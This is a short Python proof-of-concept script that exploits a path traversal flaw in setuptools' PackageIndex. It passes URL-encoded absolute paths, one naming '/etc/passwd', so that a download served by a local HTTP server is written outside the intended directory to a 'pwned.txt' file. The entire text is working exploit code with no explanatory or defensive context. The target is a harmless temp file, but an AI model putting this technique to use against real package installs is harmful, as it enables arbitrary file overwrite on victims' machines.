import os, tempfile, threading, http.server, functools
from setuptools.package_index import PackageIndex

tmpdir = tempfile.mkdtemp()
target = os.path.join(tempfile.mkdtemp(), "pwned.txt")
print(PackageIndex._resolve_download_filename("https://example.org/pkg/%2Fetc%2Fpasswd", tmpdir))

class H(http.server.SimpleHTTPRequestHandler):
    def translate_path(self, path): return os.path.abspath("srv/x")
    def log_message(self, *a): pass
srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
url = f"http://127.0.0.1:{srv.server_port}/pkg/" + target.replace("/", "%2F")
print(PackageIndex().download(url, tmpdir), os.path.exists(target), open(target).read())
